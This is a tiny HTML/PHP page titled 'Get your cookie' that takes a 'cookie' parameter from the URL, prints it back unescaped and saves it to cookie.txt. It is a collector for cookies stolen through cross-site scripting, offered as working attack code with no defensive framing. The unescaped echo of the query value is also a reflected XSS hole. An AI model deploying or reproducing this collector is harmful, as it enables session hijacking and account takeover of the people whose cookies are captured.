<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
</head>
<body>
    <h1>Get your cookie</h1>
    <span>Your cookie is: <?php echo $_GET['cookie'];?>></span>
    <?php
    file_put_contents("cookie.txt", $_GET['cookie']); 
    ?>
</body>
</html>